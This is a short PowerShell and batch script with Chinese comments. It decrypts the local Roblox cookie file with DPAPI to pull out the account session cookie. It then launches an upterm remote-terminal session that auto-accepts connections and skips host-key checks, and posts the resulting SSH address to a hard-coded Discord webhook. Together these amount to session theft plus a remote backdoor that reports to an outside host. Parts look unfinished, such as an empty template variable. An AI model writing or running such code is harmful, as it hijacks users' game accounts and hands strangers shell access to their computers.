$OutputEncoding = [System.Text.Encoding]::UTF8

# 0.5 取得token
$p="$env:LocalAppData\Roblox\LocalStorage\RobloxCookies.dat"; if(Test-Path $p){ [void][Reflection.Assembly]::LoadWithPartialName('System.Security'); $j=(Get-Content $p -Raw|ConvertFrom-Json).CookiesData; $d=[Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($j),$null,'CurrentUser'); $s=[Text.Encoding]::UTF8.GetString($d); if($s -match '(_\|WARNING.*?)(;|$)'){$cookie=$matches[1]; $cookie} }else{"Roblox Not Found"}

:: 1. 設定 Webhook URL
set "WEBHOOK=https://discord.com/api/webhooks/1501523254404190209/qnfTbYgfNuOCOBbEQwuMHHHYCltqgM8iQkpCy0NFTaS14oRmKqfysIQKthauw4YFgGez"

:: 2. Base64 編碼的 JSON 模板 (內含標題、顏色、Fields 與 Footer)
set ""

:: 3. 執行 PowerShell 處理邏輯
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$uuid = [guid]::NewGuid().ToString(); ^
    $jsonTemplate = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%B64%')); ^
    upterm host --accept --skip-host-key-check 2>&1 | ForEach-Object { ^
        Write-Host $_; ^
        if ($_ -match 'ssh\s+\S+@\S+') { ^
            $sshAddr = $Matches[0]; ^
            $payload = $jsonTemplate.Replace('{uuid}', $uuid).Replace('{ssh}', $sshAddr); ^
            $bytePayload = [Text.Encoding]::UTF8.GetBytes($payload); ^
            Invoke-RestMethod -Uri '%WEBHOOK%' -Method Post -Body $bytePayload -ContentType 'application/json; charset=utf-8'; ^
            Write-Host '>>> Discord 通知已發送'; ^
        } ^
    }"
